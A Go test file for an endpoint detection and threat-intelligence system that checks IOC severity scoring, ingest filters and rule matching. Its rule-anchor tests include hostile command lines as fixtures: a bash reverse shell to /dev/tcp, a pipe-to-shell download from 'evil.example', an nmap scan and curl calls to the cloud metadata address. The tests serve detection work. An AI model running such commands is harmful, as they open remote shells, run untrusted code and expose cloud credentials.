package api

// Regression anchors for the detection / threat-intel false-positive work.
// Command lines are in agent format: argv joined with spaces, no quotes.

import (
	"testing"
	"time"

	"obsidianwatch/management/internal/store"
)

func fxProcRaw(name, cmd, raw string) store.Event {
	e := fxProc(name, cmd)
	e.Raw = []byte(raw)
	return e
}

func sigMatches(t *testing.T, id string, ev store.Event) bool {
	t.Helper()
	s, ok := fxFind(id)
	if !ok {
		t.Fatalf("unknown rule %s", id)
	}
	return s.Match(ev)
}

func TestIOCKnownGoodGate(t *testing.T) {
	dash := store.IOCIndicator{Source: "otx", IOCType: "hash", Value: "abc", Severity: 4, Confidence: 70}

	// lsb_release runs via dash; the agent says the binary is package-verified.
	ev := fxProcRaw("lsb_release", "/bin/sh /usr/bin/lsb_release -a", `{"exe":"/usr/bin/dash","pkg_verified":true}`)
	if got := iocKnownGoodAdjust(ev, dash); got.Severity != iocSevInfo {
		t.Errorf("pkg_verified=true: severity %d, want %d", got.Severity, iocSevInfo)
	}

	// Verification unknown (no field), system path: capped at Medium.
	ev = fxProcRaw("lsb_release", "/bin/sh /usr/bin/lsb_release -a", `{"exe":"/usr/bin/dash"}`)
	if got := iocKnownGoodAdjust(ev, dash); got.Severity != iocSevMedium {
		t.Errorf("unknown verification in /usr/bin: severity %d, want %d", got.Severity, iocSevMedium)
	}

	// Explicitly NOT package-verified: a tampered system binary keeps full severity.
	ev = fxProcRaw("lsb_release", "/bin/sh /usr/bin/lsb_release -a", `{"exe":"/usr/bin/dash","pkg_verified":false}`)
	if got := iocKnownGoodAdjust(ev, dash); got.Severity != 4 {
		t.Errorf("pkg_verified=false in /usr/bin: severity %d, want 4", got.Severity)
	}

	// Unknown (no field) outside system dirs: untouched.
	ev = fxProcRaw("x", "/tmp/x", `{"exe":"/tmp/x"}`)
	if got := iocKnownGoodAdjust(ev, dash); got.Severity != 4 {
		t.Errorf("tmp binary: severity %d, want 4", got.Severity)
	}

	// Only hash IOCs are gated.
	ip := store.IOCIndicator{Source: "otx", IOCType: "ip", Severity: 4}
	ev = fxProcRaw("x", "x", `{"exe":"/usr/bin/x","pkg_verified":true}`)
	if got := iocKnownGoodAdjust(ev, ip); got.Severity != 4 {
		t.Errorf("ip IOC changed: %d", got.Severity)
	}
}

func TestIOCSuppressIDs(t *testing.T) {
	if got := iocSuppressID(store.IOCIndicator{Source: "OTX", IOCType: "hash"}); got != "IOC:otx:hash" {
		t.Errorf("got %q", got)
	}
	if got := sigmaSuppressID("abc-123"); got != "SIGMA:abc-123" {
		t.Errorf("got %q", got)
	}
}

func TestOTXPulseScore(t *testing.T) {
	now := time.Now()
	if got := otxPulseScore(otxPulseMeta{HasTags: true}, now); got != 25 {
		t.Errorf("base: %d", got)
	}
	rich := otxPulseMeta{Adversary: "APT", HasFamilies: true, HasAttack: true, HasRefs: true, HasTags: true, Size: 20}
	if got := otxPulseScore(rich, now); got != 85 {
		t.Errorf("rich pulse: %d, want 85", got)
	}
	dump := otxPulseMeta{Size: 5000, AllHashes: true}
	if got := otxPulseScore(dump, now); got != otxScoreMin {
		t.Errorf("sandbox dump: %d, want %d", got, otxScoreMin)
	}
	if otxPulseScore(dump, now) >= 25 {
		t.Error("hash-only dump pulse must score below the alert threshold")
	}
	stale := otxPulseMeta{HasTags: true, Modified: now.AddDate(-1, 0, 0)}
	if got := otxPulseScore(stale, now); got != 15 {
		t.Errorf("stale: %d, want 15", got)
	}
}

func TestIOCIngestHygiene(t *testing.T) {
	cases := []struct {
		typ, val string
		ok       bool
	}{
		{"ip", "10.0.0.5", false}, {"ip", "127.0.0.1", false}, {"ip", "100.64.1.1", false},
		{"ip", "203.0.113.9", true},
		{"domain", "google.com", false}, {"domain", "sub.github.com", false},
		{"domain", "evil-c2.example-bad.xyz", true},
		{"hash", "deadbeef", true},
	}
	for _, c := range cases {
		if got := iocIngestOK(c.typ, c.val); got != c.ok {
			t.Errorf("iocIngestOK(%s,%s)=%v want %v", c.typ, c.val, got, c.ok)
		}
	}
}

func TestSSHTunnelFlags(t *testing.T) {
	yes := []string{"ssh -L8080:localhost:80 h", "ssh -NfD 1080 h", "ssh -R 0.0.0.0:2222:localhost:22 h", "ssh -R 8080:localhost:80 jump"}
	no := []string{"ssh -l deploy host", "ssh host", "ssh -o StrictHostKeyChecking=no host", "ssh -p 2222 host"}
	for _, c := range yes {
		if !sshTunnelFlags(c) {
			t.Errorf("should match: %q", c)
		}
	}
	for _, c := range no {
		if sshTunnelFlags(c) {
			t.Errorf("must not match: %q", c)
		}
	}
}

func TestLinuxRuleAnchors(t *testing.T) {
	// Production shape: quotes lost in the joined command line.
	healthcheck := fxProc("bash", "bash -c curl -fsS https://example.com/health")
	if sigMatches(t, "L-T1059.004a", healthcheck) {
		t.Error("bash -c curl <health url> must not alert")
	}
	reverse := fxProc("bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
	if !sigMatches(t, "L-T1059.004a", reverse) {
		t.Error("bash reverse shell must alert")
	}
	docker := fxProc("bash", "bash -c curl -fsSL https://get.docker.com | sh")
	if sigMatches(t, "L-T1059.004a", docker) {
		t.Error("allow-listed installer must not raise the Sev 4 rule")
	}
	if !sigMatches(t, "L-T1059.004d", docker) {
		t.Error("allow-listed installer should raise the Sev 3 rule")
	}
	evil := fxProc("bash", "bash -c curl http://evil.example/a.sh | sh")
	if !sigMatches(t, "L-T1059.004a", evil) {
		t.Error("pipe-to-shell from an unknown host must alert")
	}

	// Shebang script: comm is the script name, exe is the interpreter.
	lsb := fxProcRaw("lsb_release", "/bin/sh /usr/bin/lsb_release -a", `{"exe":"/usr/bin/dash"}`)
	if sigMatches(t, "L-T1059.004a", lsb) {
		t.Error("lsb_release via dash must not alert")
	}
	revScript := fxProcRaw("shell.sh", "/bin/sh shell.sh /dev/tcp/1.2.3.4/4444", `{"exe":"/usr/bin/dash"}`)
	if !sigMatches(t, "L-T1059.004a", revScript) {
		t.Error("shebang script with /dev/tcp must alert via the interpreter")
	}

	// SSH brute force: single lines are not brute force.
	for _, msg := range []string{
		"Failed password for root from 1.2.3.4 port 22 ssh2",
		"pam_unix(sudo:auth): authentication failure; logname=a uid=1000 user=a",
		"Invalid user admin from 1.2.3.4",
	} {
		if sigMatches(t, "L-T1110.001", fxLogonMsg(msg)) {
			t.Errorf("single line must not alert: %q", msg)
		}
	}
	if !sigMatches(t, "L-T1110.001", fxLogonMsg("ssh_brute_force from 1.2.3.4")) {
		t.Error("agent-classified brute force must alert")
	}

	// Tor / proxy: substring "tor " used to match monitor/editor/generator.
	for _, cmd := range []string{"monitor --check", "editor file", "generator run"} {
		if sigMatches(t, "L-T1090.003", fxProc("x", cmd)) {
			t.Errorf("must not match %q", cmd)
		}
	}
	if !sigMatches(t, "L-T1090.003", fxProc("tor", "/usr/bin/tor")) {
		t.Error("tor exec must alert")
	}

	// Scanners / packet capture: only real executions.
	if sigMatches(t, "L-T1046", fxProc("apt", "apt install nmap")) || sigMatches(t, "L-T1046", fxProc("which", "which nmap")) {
		t.Error("installing/locating nmap must not alert")
	}
	if !sigMatches(t, "L-T1046", fxProc("nmap", "nmap -sS 10.0.0.0/24")) {
		t.Error("nmap scan must alert")
	}
	if sigMatches(t, "L-T1592", fxProc("man", "man tcpdump")) {
		t.Error("man tcpdump must not alert")
	}
	if !sigMatches(t, "L-T1592", fxProc("tcpdump", "tcpdump -i eth0 -w x.pcap")) {
		t.Error("tcpdump capture must alert")
	}
}

func TestMatchHelpers(t *testing.T) {
	ev := fxProcRaw("lsb_release", "/bin/sh x", `{"exe":"/usr/bin/dash","argv":["/bin/sh","-c","echo hi"]}`)
	if exeBase(ev) != "dash" {
		t.Errorf("exeBase=%q", exeBase(ev))
	}
	if got := shellPayload(ev); got != "echo hi" {
		t.Errorf("shellPayload=%q", got)
	}
	if !hasToken(ev, "-C") {
		t.Error("hasToken should be case-insensitive")
	}
	if rawStringField(fxProcRaw("a", "a", `{"parent_exe":"/usr/bin/bash"}`), "parent_exe") != "/usr/bin/bash" {
		t.Error("rawStringField")
	}
}

func fxNetProc(name, dst string) store.Event {
	e := fxProc(name, name)
	d := dst
	e.EventType, e.DstIP = "network", &d
	return e
}

func TestIMDSRules(t *testing.T) {
	if sigMatches(t, "NET-IMDS-001", fxNetProc("amazon-ssm-agent", "169.254.169.254")) ||
		sigMatches(t, "NET-IMDS-002", fxNetProc("amazon-ssm-agent", "169.254.169.254")) {
		t.Error("guest agent must not alert")
	}
	if !sigMatches(t, "NET-IMDS-001", fxNetProc("curl", "169.254.169.254")) {
		t.Error("curl to IMDS must alert at the base rule")
	}
	if sigMatches(t, "NET-IMDS-001", fxNetProc("python3", "169.254.169.254")) || !sigMatches(t, "NET-IMDS-002", fxNetProc("python3", "169.254.169.254")) {
		t.Error("interpreter must raise only the Sev 5 rule")
	}
	// destination field, not a raw-JSON substring
	e := fxNetProc("curl", "10.0.0.5")
	e.Raw = []byte(`{"note":"169.254.169.254"}`)
	if sigMatches(t, "NET-IMDS-001", e) {
		t.Error("IMDS address in raw JSON must not match")
	}
	setIMDSExtraAllowed("custom-agent")
	defer setIMDSExtraAllowed("")
	if sigMatches(t, "NET-IMDS-001", fxNetProc("custom-agent", "169.254.169.254")) {
		t.Error("setting-extended allow-list must suppress")
	}
}

func TestIOCApplyPrevalence(t *testing.T) {
	now := time.Now()
	h := store.IOCIndicator{IOCType: "hash", Severity: 4}
	old := now.AddDate(0, 0, -10)
	if got := iocApplyPrevalence(h, 3, old, 3, now); got.Severity != 3 || got.Tags != "ioc:prevalent" {
		t.Errorf("prevalent 10-day-old hash: %+v", got)
	}
	if got := iocApplyPrevalence(h, 2, old, 3, now); got.Severity != 4 {
		t.Error("below the host threshold must not downgrade")
	}
	if got := iocApplyPrevalence(h, 5, now.AddDate(0, 0, -2), 3, now); got.Severity != 4 {
		t.Error("first seen under 7 days ago must not downgrade")
	}
	if got := iocApplyPrevalence(store.IOCIndicator{IOCType: "ip", Severity: 4}, 9, old, 3, now); got.Severity != 4 {
		t.Error("non-hash IOC must not downgrade")
	}
	if settingInt("", 3) != 3 || settingInt("x", 3) != 3 || settingInt("5", 3) != 5 {
		t.Error("settingInt")
	}
}
